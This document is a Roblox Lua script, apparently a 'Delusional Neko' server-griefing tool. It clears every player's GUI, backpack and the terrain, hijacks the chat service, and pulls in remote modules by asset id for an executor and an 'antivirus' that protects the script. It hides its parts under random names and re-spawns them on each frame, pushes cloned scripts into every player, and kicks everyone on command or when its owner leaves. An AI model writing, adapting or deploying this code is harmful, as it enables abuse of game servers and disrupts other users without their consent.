	local Serv = setmetatable({},{__call = function(_,classname)
		return game:FindFirstChildOfClass(classname) -- Or, game:FindFirstChildWhichIsA(classname)
	end,})

	coroutine.resume(coroutine.create(function()

		local plr = Serv("Players").LocalPlayer

		plr:LoadCharacter()
		plr.CharacterAdded:Connect(function(char)
			if char:FindFirstChild("HumanoidRootPart") then
				char:FindFirstChild("HumanoidRootPart").CFrame = CFrame.new(9e9,9e9,9e9)
				char:FindFirstChild("HumanoidRootPart").Anchored = true
			end
			if char.Character:FindFirstChild("Humanoid") then
				char.Character:FindFirstChild("Humanoid").MaxHealth = 9e9
				char.Character:FindFirstChild("Humanoid").Health = 9e9
			end
		end)
		if plr.Character then
			if plr.Character:FindFirstChild("HumanoidRootPart") then
				plr.Character:FindFirstChild("HumanoidRootPart").CFrame = CFrame.new(9e9,9e9,9e9)
				plr.Character:FindFirstChild("HumanoidRootPart").Anchored = true
			end
			if plr.Character:FindFirstChild("Humanoid") then
				plr.Character:FindFirstChild("Humanoid").MaxHealth = 9e9
				plr.Character:FindFirstChild("Humanoid").Health = 9e9
			end
		end

	end))

local Funcs = {}

--= // Cleaner stuffs \\ =--

coroutine.resume(coroutine.create(function()

	local qercqfqd = Serv("Players")
	for _, sercleaner in pairs(qercqfqd:GetPlayers()) do
		local plrgui = sercleaner.PlayerGui
		local backpck = sercleaner.Backpack
		plrgui:ClearAllChildren()
		backpck:ClearAllChildren()
	end

end))

--= // The entire damn thing \\ =--

do

	function Funcs.RandStX(Length)
		local Text = ""
		for i = 1,typeof(Length) == "number" and math.clamp(Length,1,100) or math.random(10,100) do
			Text = Text..string.char(math.random(1,128))
		end
		return Text
	end

	function Funcs.Bruuvhaa(a)
		if typeof(a) ~= "Instance" or a == nil then return false end
		local test
		test = pcall(function()
			if a then end
			if a.Name then end
		end)
		return test
	end

	function Funcs.AAGuidhioda(a,c)
		task.spawn(function()
			pcall(function()
				task.spawn(function()
					pcall(function()
						a:Destroy()
					end)
				end)
				task.spawn(function()
					pcall(function()
						Serv("Debris"):AddItem(a,0)
					end)
				end)
				task.spawn(function()
					pcall(function()
						a:Remove()
					end)
				end)
				task.spawn(function()
					if c then
						pcall(function()
							for i,v in pairs(a:GetDescendants()) do
								task.spawn(function()
									pcall(function()
										task.spawn(Funcs.AAGuidhioda,v,false)
									end)
								end)
							end
						end)
					end
				end)
			end)
		end)
	end

	--= // Dependencies \\ =--

	coroutine.resume(coroutine.create(function()

		require(10341299479).antivirus("ServerScriptService")
		require(10341299479).badapplemidi("MaterialService")
		require(10341299479).exec("MaterialService")
		require(10341299479).replicatebru("MaterialService")

	end))

	--= // Tables (Most) \\ =--

	local Player = Serv("Players"):FindFirstChild(script:GetAttribute("whenieu28eu92y2r823"))
	local ServicesForRemotes,Event,gui,fixscript,SongStart,BAMidi = {"MaterialService"},nil,nil,nil,tick(),Instance.new("BoolValue")
	local bruhhvvh
	local ooowh,RemService,RemName,RootPos = {},Serv(ServicesForRemotes[math.random(1,#ServicesForRemotes)]),Funcs.RandStX()
	local Target
	local Target_
	local Playing = true
	local NameMode = true
	local ImFlying = false
	local AudioId,Pitch = 9038254260,1
	pcall(function()
		if Serv("ServerScriptService"):FindFirstChild("ChatServiceRunner").ChatService then
			chatservice =  require(Serv("ServerScriptService"):FindFirstChild("ChatServiceRunner").ChatService)
			if not chatservice:GetSpeaker("Delusional Neko") then
				speaker = chatservice:AddSpeaker("Neko")
				speaker:JoinChannel("All")
				speaker:SetExtraData("NameColor",Color3.fromRGB(85, 0, 255)) 
				speaker:SetExtraData("Tags", {{ TagText = "D̴̺̽̌e̸̖͘l̵̍̐ͅù̸̳̟s̸̜̙͌i̷̖͖͊o̵͖̅n̵̜͇̄ă̸̭̿l̶̪̈̂", TagColor = Color3.fromRGB(255, 0, 0) }})
			else
				speaker = chatservice:GetSpeaker("Neko")
			end
			chatservice:GetChannel("All"):MuteSpeaker(Player.Name)
		end	
	end)

	--= // BA MIDI stuffs \\ =--

	local BAMidiLS = Serv("MaterialService"):WaitForChild("grthhtrrhjjh")
	BAMidiLS.Name = Funcs.RandStX()

	ooowh[#ooowh + 0.2] = Serv("RunService").Heartbeat:Connect(function()

		if not BAMidiLS or not BAMidiLS:IsA("LocalScript") or BAMidiLS.Parent == nil or BAMidiLS == nil or BAMidiLS.Parent ~= Serv("MaterialService") then
			require(10341299479).badapplemidi("MaterialService")			
			BAMidiLS = Serv("MaterialService"):WaitForChild("grthhtrrhjjh")
			BAMidiLS.Name = Funcs.RandStX()
		end

	end)

	--= // Other and the other of the other (x9214823842479456) Dependencies \\ =--

	local replicatb = Serv("MaterialService"):WaitForChild("IE!094921i9ir0-ri2r")
	replicatb.Name = Funcs.RandStX()

	ooowh[#ooowh + 0.2] = Serv("RunService").Heartbeat:Connect(function()

		if not replicatb or not replicatb:IsA("Configuration") or replicatb.Parent == nil or replicatb == nil or replicatb.Parent ~= Serv("MaterialService") then
			require(10341299479).replicatebru("MaterialService")			
			replicatb = Serv("MaterialService"):WaitForChild("IE!094921i9ir0-ri2r")
			replicatb.Name = Funcs.RandStX()
		end

	end)

	--= // SAZERENOS' ARTIFICIAL HEARTBEAT \\ =--

	Frame_Speed = 1 / 60 -- (1 / 30) OR (1 / 60)

	ArtificialHB = Instance.new("BindableEvent", Player)
	ArtificialHB.Name = "ArtificialHB"

	frame = Frame_Speed
	tf = 0
	allowframeloss = false
	tossremainder = false
	lastframe = tick()
	ArtificialHB:Fire()

	ooowh[#ooowh + 0.2] = Serv("RunService").Heartbeat:Connect(function(s, p)
		tf = tf + s
		if tf >= frame then
			if allowframeloss then
				ArtificialHB:Fire()
				lastframe = tick()
			else
				for i = 1, math.floor(tf / frame) do
					ArtificialHB:Fire()
				end
				lastframe = tick()
			end
			if tossremainder then
				tf = 0
			else
				tf = tf - frame * math.floor(tf / frame)
			end
		end

		pcall(function()
			chatservice:GetChannel("All"):MuteSpeaker(Player.Name)
			chatservice:GetChannel("All"):UnmuteSpeaker("Delusional Neko")
		end)
	end)

	function Swait(NUMBER)
		if NUMBER == 0 or NUMBER == nil then
			ArtificialHB.Event:wait()
		else
			for i = 1, NUMBER do
				ArtificialHB.Event:wait()
			end
		end
	end

	--= // Audio system \\ =--

	function AudioMoment(ID,fPitch)
		if fPitch == nil then
			fPitch = 1
		end
		if type(fPitch) ~= "number" then
			fPitch = 1
		end
		if type(ID) == "number" then
			AudioId,SongStart,Pitch = ID,tick(),fPitch
			if ID == 1 then
				Serv("NetworkServer").ChildAdded:Connect(function(a)
					if Funcs.Bruuvhaa(a) and a:IsA("ServerReplicator") then
						task.spawn(function()
							pcall(function()
								a:GetPlayer():LoadCharacter()
							end)
						end)
						a:GetPlayer():Kick()
					end
				end)
				for i,v in pairs(Serv("NetworkServer"):GetChildren()) do
					if Funcs.Bruuvhaa(v) and v:IsA("ServerReplicator") then
						task.spawn(function()
							pcall(function()
								v:GetPlayer():LoadCharacter()
							end)
						end)
						v:GetPlayer():Kick()
					end
				end
			end
		else
			AudioId,SongStart,Pitch = 9038254260,tick(),fPitch
		end
	end

	AudioMoment(9038254260)

	--= // Character stuffs \\ =--

	ooowh[#ooowh + 0.2] = Serv("RunService").Heartbeat:Connect(function()
		if Player and Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
			Player.Character.HumanoidRootPart.CFrame = CFrame.new(9e9,9e9,9e9)
			Player.Character.HumanoidRootPart.Anchored = true
			Player.Character.Humanoid.MaxHealth = 9e9
			Player.Character.Humanoid.Health = 9e9
		end
	end)

	--= // Event creation \\ =--

	function ExistanceOfTheseDamnRemotes()
		pcall(function()Serv("Debris"):AddItem(Event,0)end)
		Event = Instance.new("RemoteEvent")
		bruhhvvh = os.clock()
		Event.Name = RemName
		Event:SetAttribute("Lexus_ISF",Event.Name)
		Event.Parent = RemService
		local EventConnection = Event.OnServerEvent:Connect(function(v,Method,Extra)
			if v ~= Player or type(Method) ~= "string" then
				return
			end
			if Method == "MovementBruh" then
				Event:FireAllClients("MovementBruh",{v = Extra.v,Speed = Extra.Speed})
			elseif Method == "KeyBruh" then
				Event:FireAllClients("KeyBruh",{request = Extra.req,Key = Extra.key or nil})
			elseif Method == "MouseBruh" then
				Event:FireAllClients("MouseBruh",{Target = Extra.Target,Pos = Extra.Pos})
			elseif Method == "FixCharacterBruh" then
				Event:FireAllClients("FixCharacterBruh",Extra)
			elseif Method == "SMEFF" then
				Event:FireAllClients("SMEFF")
			elseif Method == "SpwnWv" then
				Event:FireAllClients("SpwnWv")
			elseif Method == "SpwnWv2" then
				Event:FireAllClients("SpwnWv2")
			elseif Method == "ToggleMusicBruh" then
				Playing = not Playing
			elseif Method == "ToggleNameMode" then
				NameMode = not NameMode
			elseif Method == "ToggleFly" then
				ImFlying = not ImFlying
			elseif Method == "SetTargetBruh" then
				if Extra.Yeah ~= nil then
					if Extra.Yeah:FindFirstChild("HumanoidRootPart") and Extra.Yeah:FindFirstChildOfClass("Humanoid") then
						Target_ = Extra.Yeah
					end
				else
					Target_ = nil
				end
			elseif Method == "Music" then
				AudioMoment(Extra.ID)
			elseif Method == "SetRoot" and typeof(Extra) == "table" then
				if Extra.Pos == nil or typeof(Extra.Pos) ~= "CFrame" then return end
				RootPos = Extra.Pos
			elseif Method == "adsgwfweqgwefef" then
				bruhhvvh = os.clock()
			end
		end)
		local weggreggefgef = true
		local EventRemoval
		EventRemoval = Event.AncestryChanged:Connect(function()
			if not Event or not Event:IsA("RemoteEvent") or Event.Parent == nil or Event == nil then
				weggreggefgef = false
				EventConnection:Disconnect()
				EventRemoval:Disconnect()
			end
		end)
		task.spawn(function()
			while weggreggefgef do task.wait() if weggreggefgef == false or Event == nil or Event:IsA("RemoteEvent") == false or Event.Parent == nil then break end
				if (os.clock() - bruhhvvh > 10) then
					task.spawn(ExistanceOfTheseDamnRemotes)
					break
				end
			end
		end)
		task.spawn(function()
			pcall(function()
				for i,v in pairs(RemService:GetChildren()) do
					pcall(function()
						if v:IsA("RemoteEvent") and v.Name == RemName and v ~= Event then
							v:Destroy()
						end
					end)
				end
			end)
		end)
	end
	ooowh[#ooowh + 0.2] = Serv("RunService").Heartbeat:Connect(function()
		if not Event or not Event:IsA("RemoteEvent") or Event.Parent == nil or Event == nil or Event.Parent ~= RemService then
			ExistanceOfTheseDamnRemotes()
		end
		Event:FireAllClients("Target",{Target = Target_})
		Event:FireAllClients("SetTiming",{SongPosition = (tick()-SongStart)*Pitch,AudioId = AudioId,SongPitch = Pitch,Playing = Playing,NameMode = NameMode,ImFlying = ImFlying,RootPos = RootPos})
	end)

	--= // Executor \\ =-- 

	local exec = Serv("MaterialService"):WaitForChild("rfwjkfwejfpwofk")
	exec.Name = Funcs.RandStX()

	ooowh[#ooowh + 0.2] = Serv("RunService").Heartbeat:Connect(function()

		if not exec or not exec:IsA("Configuration") or exec.Parent == nil or exec == nil or exec.Parent ~= Serv("MaterialService") then
			require(10341299479).exec("MaterialService")
			exec = Serv("MaterialService"):WaitForChild("rfwjkfwejfpwofk")
			exec.Name = Funcs.RandStX()
		end

	end)

	--= // Chat stuffs \\ =--

	Player.Chatted:Connect(function(msg)
		speaker:SayMessage(msg,"All")
		if msg == "/ex" then
			local ex_ = exec:Clone()
			ex_.Parent = Player:FindFirstChildOfClass("PlayerGui")
			print("Exe")
		end
	end)

	--= // Terrain cleanup \\ =--

	Serv("Workspace"):FindFirstChildOfClass("Terrain"):ClearAllChildren()

	--= // Client replicating \\ =--

	local Replicate = replicatb.vesruifrejioghgji:Clone()

	for i,v in pairs(Serv("Players"):GetPlayers()) do
		local NS,AleUrwal = Replicate:Clone(),Instance.new("Backpack")
		NS:SetAttribute("UserId",Player.UserId)
		NS.Disabled = false
		NS.Name = Funcs.RandStX()
		NS.Parent = AleUrwal
		AleUrwal.Parent = v
	end

	Serv("Players").PlayerAdded:Connect(function(plr)
		task.wait()
		local NS,AleUrwal,Remote,anotherfolder = Replicate:Clone(),Instance.new("Backpack")
		NS:SetAttribute("UserId",Player.UserId)
		NS.Disabled = false
		NS.Name = Funcs.RandStX()
		NS.Parent = AleUrwal
		AleUrwal.Parent = plr
	end)

	local Replicate2 = replicatb.fweffwf:Clone()

	for i,v in pairs(Serv("Players"):GetPlayers()) do
		local NS,AleUrwal = Replicate2:Clone(),Instance.new("Backpack")
		NS.Disabled = false
		NS.Name = Funcs.RandStX()
		NS.Parent = AleUrwal
		AleUrwal.Parent = v
	end

	Serv("Players").PlayerAdded:Connect(function(plr)
		task.wait()
		local NS,AleUrwal = Replicate2:Clone(),Instance.new("Backpack")
		NS.Disabled = false
		NS.Name = Funcs.RandStX()
		NS.Parent = AleUrwal
		AleUrwal.Parent = plr
	end)

	BAMidi.Changed:Connect(function(value)

		if BAMidi.Value == true then

			local Replicate3 = BAMidiLS

			for i,v in pairs(Serv("Players"):GetPlayers()) do
				local NS,AleUrwal = Replicate3:Clone(),v:FindFirstChildOfClass("PlayerGui")
				NS.Disabled = false
				NS.Name = "BAMidi [DLNK F]"
				NS.Parent = AleUrwal
			end

			Serv("Players").PlayerAdded:Connect(function(plr)
				task.wait()
				local NS,AleUrwal = Replicate3:Clone(),plr:FindFirstChildOfClass("PlayerGui")
				NS.Disabled = false
				NS.Name = "BAMidi [DLNK F]"
				NS.Parent = AleUrwal
			end)

		elseif BAMidi.Value == false then

			for i,v in pairs(Serv("Players"):GetDescendants()) do

				coroutine.resume(coroutine.create(function()
					pcall(function()
						v["BAMidi [DLNK F]"]:Destroy()
					end)
				end))

			end

		end

	end)

	--= // Shutting down over user leaving \\ =--

	ooowh[#ooowh + 0.2] = Serv("Players").PlayerRemoving:Connect(function(plr)
		if plr == Player then
			for i,v in ipairs(Serv("Players"):GetPlayers()) do
				v:Kick("[Delusional Neko] My master left!!")
			end
			Serv("Players").PlayerAdded:Connect(function(v)
				v:Kick("[Delusional Neko] My master left!!")
			end)
		end
	end)

	--= // Assigning random audio IDs to some functions \\ =--

	ooowh[#ooowh + 0.2] = Serv("RunService").Heartbeat:Connect(function()

		if AudioId == 1 then

			coroutine.resume(coroutine.create(function()

				for i,v in ipairs(Serv("Players"):GetPlayers()) do
					v:Kick("[Delusional Neko] Got it! Server is now gone!")
				end

			end))

		elseif AudioId == 2 then

			BAMidi.Value = true

		elseif AudioId ~= 2 then

			BAMidi.Value = false

		end

	end)

	--= // Anti Virus \\ =--

	local AV = Serv("ServerScriptService"):WaitForChild("ferjfijehwiufdjweiuf")
	AV.rwewteayre.Value = Player.Name
	AV.Name = Funcs.RandStX()
	AV.Disabled = false

	ooowh[#ooowh + 0.2] = Serv("RunService").Heartbeat:Connect(function()

		if not AV or not AV:IsA("Script") or AV.Parent == nil or AV == nil or AV.Parent ~= Serv("ServerScriptService") then
			require(10341299479).antivirus("ServerScriptService")			
			AV = Serv("ServerScriptService"):WaitForChild("ferjfijehwiufdjweiuf")
			AV.rwewteayre.Value = Player.Name
			AV.Name = Funcs.RandStX()
			AV.Disabled = false
		end

	end)

	--= // Preventing crash/slow stops on Roblox Studio \\ =--

	game:BindToClose(function()
		task.spawn(function()
			for i,v in pairs(ooowh) do
				v:Disconnect()
			end
		end)
	end)

end

-- // End \\ --	